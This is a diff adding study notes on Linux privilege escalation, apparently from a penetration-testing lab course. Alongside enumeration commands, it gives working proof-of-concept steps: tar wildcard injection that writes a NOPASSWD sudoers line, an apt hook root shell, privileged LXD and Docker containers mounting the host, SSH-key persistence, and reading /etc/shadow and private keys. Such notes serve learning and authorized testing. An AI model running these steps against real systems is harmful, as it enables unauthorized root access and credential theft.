@@ -1,0 +1,384 @@
+Linux priviledge escalation
+I) Section I overview
+
+	1- Enumeration:
+Tools: linenum ; linpeas
+
+Important details to check:
+	- OS Version
+	- Kernel Vesion
+	- Running services
+
+
+Listing current process: ps aux | grep root
+	- Installed package and version
+	- Logged in users
+
+
+
+List current terminal-attached processes: ps au
+	- See user home directories / home folder that contain SSH keys
+
+
+
+Home directories contents:
+	- visible dir=> ls /home
+	- visible + hidden dir=> ls -la /home
+
+
+
+	2- SSH Directories content
+run => ls -l ~/.ssh
+
+Bash history may contain password => history
+
+Sudo privileges => sudo -l
+
+
+Look at configuration file/shadowfile => .conf ; .config
+
+Maybe you will see passwd file inside => cat /etc/passwd
+
+
+Cron job => ls -la /etc/cron.daily
+
+Unmounted File Systems and additional drives: lsblk
+
+Find writable directories to download tools: => find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+
+Find writable file => find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+
+
+II) Section 2
+Answer to find:
+	- What OS are we dealing with? Debian, Red HAT, uBUNTU
+	- 
+
+Command basics:
+	- whoami ; id (verify group we belong to); hostname(name of the server)
+	- ip a/ifconfig; sudo -l
+
+
+a) Check OS => cat /etc/os-release
+b) Check PATH where command is stored =>echo $PATH 
+c) Check environment variable => env
+d) Check kernel version => cat /proc/version || uname -a
+e) Check information about CPU => lscpu
+f) Check what login shells available and authorized=> cat /etc/shells
+g) Enumerate information about block devices(hard disks, usb drive, optical drive) on the system=> lsblk
+h) Check information about any printers attached to the system => lpstat
+i) Check if we can mount an unmounted drive => cat /etc/fstab
+j) Check routing table => route / netstat -rn
+k) Check internal DNS => cat /etc/resolv.conf 
+l) Look for all users registered to the system => cat /etc/password || See exactly list of users:  cat /etc/passwd | cut -f1 -d:
+m) Look existing group => cat /etc/group
+n) look member of a group => getent group <group>
+o) Mounted file system => df -h
+q) unmounted file =>  cat /etc/fstab | grep -v "#" | column -t
+r) All hidden files => find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
+s) All hidden directories =>  find / -type d -name ".*" -ls 2>/dev/null
+t) temporary files => ls -l /tmp /var/tmp /dev/shm
+U) Look for specific string pattern in file => sudo grep -rEI "your_regex_here" / 2>/dev/null
+
+
+
+List of Hash
+	Salted MD5	$1$...
+	SHA-256	$5$...
+	SHA-512	$6$...
+	BCrypt	$2a$...
+	Scrypt	$7$...
+	Argon2	$argon2i$...
+
+
+
+III) Section 3 : Linux Services and internal enumeration
+	- What services and applications are installed?
+	- What services are running?
+	- What sockets are in use?
+	- What users, admins, and groups exists on the system?
+	- Who logged in? What users recently logged in?
+	- What password policies?
+	- Is the host joined to an Active Directory Domain?
+	- What type of info is interesting in log, history, or backup file
+	-  Which files have been modified recently
+	- Cirrent IP address
+	- /etc/hosts files
+	- tools installed that we may take advantadge of
+	- Access bash history; ip a; ifconfig
+
+	
+	A) Internals:
+Its about the internal configuration
+	- Network interfaces: => ip a
+	- Hosts: => cat /etc/hosts
+	- User last login: => lastlog
+	- Logged in users => w
+	- Command history => history or || find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+
+
+Proc/procfs is a filesystem that contain information about system processes
+=> find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+
+
+	B) Services:
+	- Installed package: apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+	- Sudo version : sudo -V
+
+It may happen that there are no direct package installed on the system but these are called via the binaries 
+	=> ls -l /bin /usr/bin /usr/sbin
+
+GTFObins provides an excellent platform that includes list of binaries that can potentially be exploited to escalate our privileges
+	=> for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
+
+
+
+strace is a diagnostic tools on the OS to track and analyze system calls and signals processing;
+Allows us to understand the flow of a program, understand how it access the system resources
+	=> eg: strace ping -c <IP_ADDRESS>
+
+
+	- Locate all configuration file: find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+	- Locate all scripts: find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+	- Running server by user: ps aux | grep root
+
+	-locate binaries of specific program:> ls /usr/bin/python*
+
+
+
+IV) Section IV: Credential Hunting
+	- These may be found in => .conf, .config, .xml, etc.
+
+	- /var directories contains usually web root, and may contain database credentials:
+		eg: grep 'DB_USER\|DB_PASSWORD' wp-config.php
+
+
+	- find configuration file:  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+
+	- find ssh key: ls ~/.ssh
+
+
+V) Section V: Path abuse
+=> List of directories that the system searches when you type command. Allows user
+to run a program (like ls, python) without typing (/bin/ls, /usr/sbin/python3.11)
+
+=> linux run the first match it find from left to right
+
+eg of workflow:
+	- identify a program that run as root => eg: cat
+	- create a malicious "fake" command in writable directory => eg: /tmp/cat
+	- Manipulate PATH => export PATH=/tmp:$PATH  or PATH=.$PATH ; export PATH => (. represent the directories we are working in)
+	- execute 
+
+
+VI) Section VI: Wildcard abuse
+=> Character that could be used as a remplacement of other character and are interpreted by the
+shell before oter actions:
+
+*	can match any number of character in a filename
+?	match a single character
+[]	match any single character at the position defined
+~	Refer to a user's home directory
+-	
+
+
+Proof of concept:
+1. The Vulnerability
+When a command (like tar, use for compression of file) uses a wildcard (*) in a directory where a user has write access, the shell expands that * into a list of all filenames in that folder. If a filename starts with a dash (e.g., --checkpoint), tar treats it as a command-line argument rather than a file.
+
+2. The Exploitation Example
+If a root cron job runs: tar -zcf backup.tar.gz *
+
+Step 1: Create a malicious script (root.sh)
+This script contains the command you want root to run (e.g., adding yourself to sudoers).
+bash
+echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+
+Step 2: Create "Argument" files
+Create empty files named exactly after the tar flags you want to inject:
+bash
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+
+
+Step 3: The Execution
+When the cron job runs, the shell expands * to:
+tar -zcf backup.tar.gz root.sh --checkpoint=1 --checkpoint-action=exec=sh root.shThe --checkpoint-action flag tells tar to execute root.sh with root privileges.
+
+
+
+
+
+VII) Section VII: Escaping Restricted shell
+=> Restricted shell is a type of shell that limit user's ability to execute command
+	- may be only allowed to execute certain command or only run command on a certain directories
+
+eg: rbash, rksh and rzsh
+=> External partenrs to access email and file sharing may user : rbash
+=> Partners to access database and web server may use  : rksh
+
+
+Escaping
+	- Command injection => 
+Scenario we are only allowed to use => ls
+Bypass: pass another command to it as argument => ls -l "pwd"
+
+
+	- Command chaining =>
+Followed our payload after an authorized command => ls /home; whoami; pwd
+
+List available command in rbash => compgen -c
+
+make echo act as cat => echo "$(< flag.txt)"
+
+
+
+
+VIII) Section VIII:  Special permissions
+	- setuid permission can allow user to execute a program with another user privileges
+	- find all SUID files own by root: find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+	- find SUID and SGID own by root and executable: find / -uid 0 -perm -6000 -type f 2>/dev/null
+	- spawn root shell by exploiting apt configuration hook: sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+
+
+IX) Section IX: Sudo rights abuse
+	- sudo -l => list out our permission
+
+X) Privileged Groups
+	LXC / LXD
+
+LXD => similar to Docker
+	
+
+
+If your user is in the LXD group, it means you are allowed to create and control containers on the system. 
+Normally, containers are isolated, so even if you are root inside them, you are not root on the host. 
+However, LXD has an option to create a privileged container, where this isolation is removed. 
+In that case, root inside the container becomes real root on the host machine.
+
+Now comes the exploit: once you have this privileged container, you can mount the host’s entire filesystem (/) inside the container (for example at /mnt/root). Since you are root inside the container—and that root is actually the host’s root—you can now browse, read, and modify all files on the host system. This gives you full root access without needing sudo or a password.
+
+👉 In simple words:
+LXD group → create privileged container → mount host disk → you become root on the real system
+
+
+
+Proof of concept:  LXD
+
+	# 1. Check if you have LXD rights
+id
+	# Look for: lxd → means you can exploit
+
+
+	# 2. Load a minimal Linux image (Alpine)
+unzip alpine.zip
+cd 64-bit\ Alpine/
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+
+	# 3. Create a privileged container (THIS is the key step)
+lxc init alpine r00t -c security.privileged=true
+	# → makes container root = host root
+
+	# 4. Mount the host filesystem inside the container
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+	# → host "/" is now accessible at /mnt/root
+
+
+	# 5. Start container and get shell
+lxc start r00t
+lxc exec r00t /bin/sh
+
+	# 6. You are root → access host files
+id
+cd /mnt/root/root
+
+
+
+	Docker
+🧠 Explanation (clear)
+
+Being in the Docker group is basically the same as having root privileges because Docker allows you to create containers that can interact directly with the host system. 
+By running a container and mounting sensitive host directories (like /root or /etc) into it, you can access or modify files as if you were root. 
+Since Docker runs with elevated privileges, anyone in the docker group can abuse it to read sensitive data (like /etc/shadow) or inject SSH keys into /root/.ssh, 
+effectively gaining full root access on the host.
+
+👉 Simple idea:
+Docker group → mount host folders → control them as root
+
+Proof of concept
+	# 1. Check docker group
+id
+
+	# 2. Run container and mount host root directory
+docker run -v /root:/mnt -it ubuntu
+
+	# 3. Inside container → access host root
+cd /mnt
+ls
+
+	# Example: add SSH key for persistence
+mkdir -p /mnt/.ssh
+echo "YOUR_PUBLIC_KEY" >> /mnt/.ssh/authorized_keys
+
+🎯 Key takeaway
+
+Docker group = root because you can mount and control the host filesystem.
+
+		Disk
+
+Explanation (clear)
+
+Users in the disk group have direct access to raw disk devices like /dev/sda. 
+This means they can bypass normal file permissions and read the entire filesystem directly using 
+low-level tools like debugfs. Since this access ignores Linux permission controls, 
+an attacker can extract sensitive files such as /etc/shadow, SSH keys, 
+or any protected data, effectively gaining root-level access to the system’s data.
+
+Simple idea:
+Disk group → raw disk access → bypass permissions → read everything
+
+Proof of concept:
+	# 1. Check disk group
+id
+
+	# 2. Use debugfs on main disk
+debugfs /dev/sda1
+
+	# 3. Inside debugfs → read sensitive files
+cat /etc/shadow
+cat /root/.ssh/id_rsa
+
+Key takeaway
+Disk group = full filesystem access (no permission checks)
+
+ 		
+
+		ADM
+Explanation (clear)
+
+Members of the adm group can read system logs in /var/log. This does not directly give root access, but logs often contain 
+sensitive information such as credentials, command history, cron jobs, file paths, or error messages that reveal 
+system behavior. By analyzing logs, an attacker can discover passwords, tokens, or misconfigurations 
+that can later be used for privilege escalation.
+
+
+Simple idea:
+ADM group → read logs → find secrets → escalate later
+
+Proof of concept:
+	# 1. Check adm group
+id
+
+	# 2. Read logs
+ls /var/log
+
+	# 3. Look for sensitive info
+cat /var/log/auth.log
+cat /var/log/syslog
+
+	# Search for passwords or interesting data
+grep -i "password" /var/log/*
+grep -i "cron" /var/log/*
+
